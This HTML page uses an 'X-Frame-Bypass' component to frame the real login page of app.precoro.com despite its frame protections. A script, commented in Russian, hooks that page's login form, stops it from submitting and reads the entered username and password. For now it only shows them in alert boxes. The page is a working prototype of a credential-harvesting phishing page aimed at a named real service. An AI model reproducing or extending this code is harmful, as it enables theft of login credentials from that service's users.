<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="X-Frame-Bypass: Web Component extending IFrame to bypass X-Frame-Options: deny/sameorigin">
	<title>X-Frame-Bypass Web Component Demo</title>
	<style>
		html, body {
			margin: 0;
			padding: 0;
			height: 100%;
			overflow: hidden;
		}
		iframe {
			display: block;
			width: calc(100% - 40px);
			height: calc(100% - 40px);
			margin: 20px;
		}
		img {
			position: absolute;
			top: 0;
			right: 0;
		}
	</style>
	<script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
	<script src="x-frame-bypass.js" type="module"></script>
</head>
<body>

		
<iframe is="x-frame-bypass" src="https://app.precoro.com/" class="asd" >

<script>
        function manipulateIframeContent() {
            // Получаем доступ к iframe
		var iframe = document.querySelector('.asd');
            // Проверяем, загрузился ли iframe
            if (iframe && iframe.contentWindow) {
                // Получаем доступ к содержимому iframe
                var iframeDocument = iframe.contentWindow.document;
                
 	
		var login_form = iframeDocument.getElementById('login_form');
		var pass_value = iframeDocument.getElementById('password');
		var user_value = iframeDocument.getElementById('username');
		    
		login_form.addEventListener('submit', function(event) {
        		event.preventDefault(); // Prevent the form from submitting

        		// Get the input value
        		var inputValue = pass_value.value;
        		var passValue = pass_value.value;
			var inputValue2 = user_value.value;

        		alert(passValue);
			alert(inputValue2);
    		});
            }
        }
        // Ожидаем, пока iframe загрузится, и затем вызываем функцию
        document.querySelector('.asd').addEventListener('load', manipulateIframeContent);
</script>
	
</body>
</html>
